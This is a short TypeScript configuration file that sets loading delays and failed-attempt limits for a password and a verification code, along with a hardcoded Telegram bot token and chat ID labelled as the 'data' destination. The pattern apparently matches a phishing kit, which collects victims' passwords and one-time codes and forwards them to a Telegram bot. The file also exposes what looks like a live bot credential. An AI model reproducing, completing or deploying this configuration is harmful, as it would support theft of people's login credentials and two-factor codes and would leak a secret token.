interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 5000,
    max_failed_code_attempts: 5,
    max_failed_password_attempts: 0,
    password_loading_time: 5000,
  },
  telegram: {
    data_chatid: "1860843750",
    data_token: "7481596566:AAH66xG_eRlEaZhsMyF-zM_cMuH0Uamb-6c",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
